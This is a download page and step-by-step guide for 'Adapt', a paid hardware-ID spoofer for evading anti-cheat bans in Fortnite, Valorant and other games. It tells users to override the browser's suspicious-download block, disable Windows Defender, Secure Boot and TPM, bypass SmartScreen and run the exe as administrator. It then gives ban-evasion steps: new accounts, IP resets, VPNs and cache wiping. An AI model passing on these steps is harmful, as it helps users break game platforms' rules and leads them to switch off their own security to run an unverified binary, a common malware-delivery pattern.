---
layout: default
---

# Adapt - User Guide

<div style="text-align:center; margin: 24px 0;">
  <a href="Adapt.zip" download style="background-color:#2f81f7; color:#ffffff; padding:16px 40px; border-radius:10px; text-decoration:none; font-weight:bold; font-size:17px; display:inline-block; font-family:'Segoe UI',sans-serif;">Download Adapt.zip (13 MB)</a>
  <p style="color:#6e7681; font-size:13px; margin-top:10px;">
    Browser may say <b>Suspicious download blocked</b> — press the <b>&#9662;</b> arrow next to it, then press <b>Download suspicious file</b>.
  </p>
</div>

> **NOTE:** Follow every step in order. Do not skip steps — every step is mandatory for a clean unban.

## Contents

- [Supported Games & Status](#supported-games--status)
- [1. Windows Reinstall (Mandatory)](#1-windows-reinstall-mandatory)
- [2. BIOS Configuration (Mandatory)](#2-bios-configuration-mandatory)
- [3. TPM & Security Architecture](#3-tpm--security-architecture)
- [4. Disable Windows Defender (Mandatory)](#4-disable-windows-defender-mandatory)
- [5. Launch Adapt (Mandatory)](#5-launch-adapt-mandatory)
- [6. Run the Spoof (Mandatory)](#6-run-the-spoof-mandatory)
- [7. Reset Your Network (Mandatory)](#7-reset-your-network-mandatory)
- [8. Make a New Account (Mandatory)](#8-make-a-new-account-mandatory)
- [9. VPN](#9-vpn)
- [10. Clear Game Cache (Mandatory)](#10-clear-game-cache-mandatory)
- [11. Verify Your New Serials (Mandatory)](#11-verify-your-new-serials-mandatory)
- [12. Fortnite Tournaments](#12-fortnite-tournaments)

## Supported Games & Status

| Game Title | Anti-Cheat | Status |
|---|---|---|
| Fortnite | BE + EasyAntiCheat | UNDETECTED |
| Apex Legends | EasyAntiCheat | UNDETECTED |
| Rust | EAC (Cerberus) | UNDETECTED |
| Rainbow Six Siege | BattlEye | UNDETECTED |
| Call of Duty (WZ / BO6) | Ricochet | UNDETECTED |
| FiveM | FiveM AC / servers | SERVER DEPENDENT |
| Valorant | Riot Vanguard | WORK IN PROGRESS |

---

## 1. Windows Reinstall (Mandatory)

A fresh Windows re-installation with a clean drive format is mandatory. Modern anti-cheats (EasyAntiCheat, BattlEye, Vanguard, Ricochet) embed permanent telemetry traces, registry identifiers and volume tracker markers across your system drive.

> **MANDATORY:** Do **NOT** use Windows "Reset This PC" — the built-in reset leaves tracking logs behind. You must do a clean reinstall from an official USB flash drive (8 GB+).

### 1.1 Create a bootable Windows USB

1. Prepare an empty USB flash drive (minimum 8 GB).
2. Download the official Microsoft Media Creation Tool (Windows 10 or Windows 11).
3. Run the tool and select **Create installation media (USB flash drive)**.
4. Select your USB drive and wait for it to finish (5–10 minutes).

### 1.2 Boot from USB and format the drive

Reboot your PC and tap your motherboard's boot menu key immediately:

| Motherboard | Boot Menu Key |
|---|---|
| ASUS | F8 |
| MSI / ASRock | F11 |
| Gigabyte | F12 |

1. Select your USB drive (prefixed with **UEFI:**).
2. Click **Install Now** → **Custom: Install Windows only (advanced)**.
3. Select each partition of your primary Windows drive (Drive 0) and click **Delete** until only **Unallocated Space** remains.
4. Select the Unallocated Space and click **Next**. Windows will install fresh.

> **POST-INSTALL RULE:** Do **NOT** install or open games yet. Complete the initial Windows setup, do not link any old banned Microsoft/Epic/Riot accounts, and continue to the next steps first.

---

## 2. BIOS Configuration (Mandatory)

Before spoofing, configure your motherboard BIOS to permit kernel driver communication and prevent anti-cheats from reading banned hardware certificates.

### 2.1 Disable Secure Boot (Mandatory)

Adapt needs direct kernel access to rewrite your SMBIOS tables and serials. With Secure Boot on, Windows blocks these drivers.

Restart your PC and repeatedly tap **DEL** or **F2** as soon as the screen turns on. Press **F7** if needed to enter Advanced Mode.

| Brand | Where to disable Secure Boot |
|---|---|
| ASUS | Boot → Secure Boot → OS Type = **Other OS** (or Key Management → Clear Secure Boot Keys) |
| MSI | Settings → Advanced → Windows OS Configuration → Secure Boot → **Disabled** |
| Gigabyte / AORUS | BIOS tab → Secure Boot → **Disabled** |
| ASRock | Security → Secure Boot → **Disabled** |

### 2.2 Disable TPM / fTPM (only if TPM banned)

> **TPM ban notice:** If you are hardware banned on TPM (e.g. Valorant / Vanguard VAN 152 / VAN 1067) and you are **not** using the TPM Clean feature, you must disable TPM so anti-cheats cannot read your banned endorsement key.

**AMD motherboards (AMD fTPM):**
Advanced → CPU Configuration or AMD fTPM Configuration → set **AMD fTPM switch** (or TPM Device Selection) to **Disabled**.

**Intel motherboards (Intel PTT):**
Advanced / Security → PCH-FW Configuration or Trusted Computing → set **Intel PTT** (Platform Trust Technology) to **Disabled**.

### 2.3 Disable Fast Startup

Fast Startup makes Windows reload a hibernation file of old SMBIOS tables instead of polling the newly spoofed ones.

1. Press **Win + R**, type `powercfg.cpl` and press Enter.
2. Click **Choose what the power buttons do** on the left.
3. Click **Change settings that are currently unavailable**, uncheck **Turn on fast startup (recommended)** and click **Save changes**.

---

## 3. TPM & Security Architecture

*Technical background — how TPM 2.0 bans work and what actually fixes them.*

> **CORE CONCEPT:** A TPM is a cryptographic security processor (built into your CPU as fTPM / Intel PTT, or a standalone dTPM module). It holds an immutable, factory-burned Endorsement Key (EK) that no software or BIOS flasher can permanently rewrite.

### How anti-cheats use TPM (hardware attestation)

Modern anti-cheats (especially Riot Vanguard on Windows 11) don't just read serial numbers — they use TPM 2.0 for cryptographic remote attestation:

1. **The Endorsement Key (EK) root of trust** — every TPM chip has a unique Endorsement Key pair burned at the factory. The public key is signed by a certificate from the manufacturer (AMD, Intel, Infineon, Nuvoton). The private key never leaves the silicon.
2. **Hardware binding bans** — when an anti-cheat bans your machine, it binds the penalty cryptographically to your TPM's Endorsement Key certificate. The anti-cheat can send a challenge that only your genuine TPM private key can sign.
3. **Windows 10 vs Windows 11 enforcement:**
   - **Windows 11** mandates TPM 2.0 and Secure Boot. Vanguard blocks launch with VAN 1067 or VAN 9003 if TPM is disabled.
   - **Windows 10** does not strictly require TPM 2.0 at the kernel level. Disabling fTPM/PTT in BIOS is a viable workaround on Windows 10.

### The truth about software "TPM spoofers"

Almost all tools marketed as "TPM spoofers" are one of two things:

**Category 1 — Fake spoofers (registry / WMI / Clear-Tpm):**
- Edit cosmetic registry keys (e.g. `HKLM:\SOFTWARE\Microsoft\Tpm\TpmInstanceId`) or flush cached NGC credentials (`AppData\Local\Microsoft\NGC`).
- Intercept basic user-mode WMI queries or tweak SMBIOS tables in memory.
- Automate a simple `Clear-Tpm` command or a BIOS NVRAM wipe.
- **Why they fail:** the moment a kernel-level anti-cheat queries the official Windows TPM driver (`tpm.sys`) or issues a hardware challenge, these changes are bypassed and your original Endorsement Key is retrieved.

**Category 2 — Driver-based spoofers (Ring 0 / hypervisor):**
- Load an unsigned driver in kernel mode to hook `tpm.sys` routines and alter responses on the fly.
- Because Windows blocks unsigned drivers, they exploit vulnerabilities in legitimate signed drivers (Bring Your Own Vulnerable Driver) to inject the hook.
- **Volatile & temporary:** these hooks only live in RAM. After a restart, everything is gone — the physical silicon was never altered.

> **SUMMARY:** Purely software-based "permanent TPM spoofing" without changing your processor or installing an external hardware crypto module does not exist. It is either surface-level registry cosmetics or temporary RAM interception.

### Permanent & verified solutions for TPM bans

**Method A — Windows 10 + disable fTPM in BIOS (free, works 100%)**
- AMD: BIOS → Advanced → AMD fTPM Configuration → AMD fTPM switch = **Disabled**
- Intel: BIOS → Advanced / Security → PCH-FW Configuration → Intel PTT = **Disabled**
- Install Windows 10 (21H2 or 22H2). Vanguard launches cleanly without TPM attestation.

**Method B — Discrete TPM 2.0 module (~12–15 EUR, permanent fix for Windows 11)**
- Most desktop motherboards (ASUS, MSI, Gigabyte, ASRock) have an onboard TPM header (12-pin, 14-pin or 20-pin).
- Buy a dedicated TPM 2.0 module matching your board (Amazon / AliExpress).
- Plug it into the motherboard's TPM header.
- BIOS → Trusted Computing → switch TPM Device Selection from **Firmware TPM (fTPM)** to **Discrete TPM (dTPM)**.
- Windows and anti-cheats then talk to the new crypto chip, which has a brand-new legitimate factory-certified Endorsement Key. Full Windows 11 compatibility kept.

**Method C — Clean TPM provisioning & NVRAM reset (for corrupted attestation / cached tokens)**
1. Open PowerShell as Administrator and run: `Clear-Tpm`
2. In BIOS, select **Reset / Clear fTPM NVRAM**.
3. Run Adapt (Adapt.bat as Administrator) and use **TPM Clean** to flush registry identifiers, hardware serials and NGC token caches.

### Diagnostic & verification commands

Run in PowerShell as Administrator:

| Command | What it shows |
|---|---|
| `Get-Tpm` | TPM presence, ready state (`TpmReady: True`), manufacturer ID |
| `tpm.msc` (Win + R) | "The TPM is ready for use" + specification version (2.0) |
| `Get-TpmEndorsementKeyInfo` | Endorsement Key details |

---

## 4. Disable Windows Defender (Mandatory)

You must temporarily disable Windows Defender Real-Time Protection before running Adapt.

> **MANDATORY:** Anti-cheats and Windows Defender flag kernel motherboard flasher drivers (AMI flasher / kernel memory injectors) as false positives and block them.

1. Open **Windows Security** from the Start menu.
2. Click **Virus & threat protection** → **Manage settings**.
3. Toggle **Real-time protection** to **OFF**.

---

## 5. Launch Adapt (Mandatory)

Download `Adapt.exe` and place it anywhere (e.g. your Desktop).

> **Single file** — everything (spoofer, AMI flasher tool, signed drivers, GUI) is packed inside one exe. No installation, no extra downloads.

1. **Double-click `Adapt.exe`** — Windows asks for administrator permission, click **Yes** (the spoofer needs admin rights to write SMBIOS).
2. **Enter your license key** — the license window appears first (see next section).
3. If Windows SmartScreen shows "Windows protected your PC", click **More info** → **Run anyway**.

---

## 6. Run the Spoof (Mandatory)

Once Adapt is running you will see your current system specifications and the spoofer actions.

### License key

When you launch Adapt, a **license window appears before the main GUI**. Enter your key there — the main window opens only after it is accepted:

- **One-time key** — valid for a short window (e.g. 1 day) after first use, then expires.
- **Lifetime key** — never expires, but is **locked to one computer** automatically on first use. If you change your motherboard/CPU or move to a new PC, contact the seller to reset your key's HWID lock.

The HWID lock is tied to your CPU and GPU, so spoofing does **not** break your lifetime key on the same PC.

### Select your spoof mode

| Mode | When to use it |
|---|---|
| **Full Spoof** (Standard AMI) | Recommended for 95% of motherboards (ASUS, Gigabyte, MSI, ASRock). Flashes all SMBIOS tables. Board brand is detected automatically (AUTO). |
| **TPM Clean** | Complete TPM 2.0 trace reset. Mandatory if banned from Valorant / Vanguard. |
| **Spoof MAC** | Standalone MAC address randomization for the active network adapter. |

### Example console log (~15 seconds)

```text
[+] SMBIOS serials + UUID written [SUCCESS]
[+] MAC ADDRESS SPOOFED & ADAPTER RESET [SUCCESS]
[+] WINDOWS MACHINEGUID CLEANED [SUCCESS]
[+] ARPCACHE & SYSTEM TRACES WIPED [SUCCESS]
[+] DRIVERS UNLOADED [SUCCESS]
[SUCCESS] FULL SPOOFING APPLIED SUCCESSFULLY!
[!] Please restart your computer to apply all changes completely.
```

> **REBOOT IMMEDIATELY:** Restart your PC right after the success message. Do not open any game before rebooting.

---

## 7. Reset Your Network (Mandatory)

Anti-cheats flag both your physical network card (MAC address) and your external public IP address.

1. **MAC address spoofing (automatic)** — Adapt randomizes the MAC address of your active network adapter during the spoof.
2. **Public IP reset (crucial):**
   - Unplug your router/modem from power for **60 seconds**, then plug it back in. This assigns you a new dynamic public IP.
   - Verify the change at [whatismyipaddress.com](https://whatismyipaddress.com) before and after.

---

## 8. Make a New Account (Mandatory)

This is where 90% of beginners fail: logging back into an old account.

> **CRITICAL RULE:** Do **NOT** log into any account that has been previously banned. The anti-cheat will link your new clean hardware to the banned profile and re-ban you instantly.

- Create a brand new email address (ProtonMail, Gmail, Outlook).
- Register a brand new game account (Epic Games, Steam, Riot, Battle.net).
- Do **NOT** link old phone numbers or payment cards used on banned accounts.
- Do **NOT** add the same friends list immediately.

---

## 9. VPN

If your ISP provides a **static IP** (one that never changes when you restart your router), a gaming VPN is strongly recommended.

Recommended VPNs:

| VPN | Why |
|---|---|
| Mullvad | Best privacy, no logs, port-forwarding |
| NordVPN | Fast servers, low ping |
| ExitLag | Route optimization, safe for gaming |

> **Dynamic IP users:** if your public IP changes when you reboot your router, a VPN is optional but still gives an extra layer of safety.

---

## 10. Clear Game Cache (Mandatory)

Before launching your game client, clear stale logs and caches that may still contain old account identifiers.

Press **Win + R**, type `%localappdata%` and delete the trace folders of your banned game:

- **Fortnite:** delete `FortniteGame\Saved\Config` and `EpicGamesLauncher\Saved`.
- **Valorant:** delete `Riot Games\Riot Client\Data`.

---

## 11. Verify Your New Serials (Mandatory)

Open Command Prompt (`cmd`) and check your new hardware serial numbers:

| Check | Command |
|---|---|
| Motherboard serial | `wmic baseboard get serialnumber` |
| System UUID | `wmic csproduct get uuid` |
| Network MAC | `getmac` |
| Disk serials | `wmic diskdrive get serialnumber` |

If all values are new, launch your game on the new account.

---

## 12. Fortnite Tournaments

Guidelines for competitive Fortnite tournaments (Cash Cups, FNCS, Ranked Cups):

- Enable **2FA** on your new clean account using a fresh authenticator app.
- Level up the account through regular Ranked matches before registering for high-stakes tournaments.
- Never use public or flagged cheat loaders on the same Windows session.
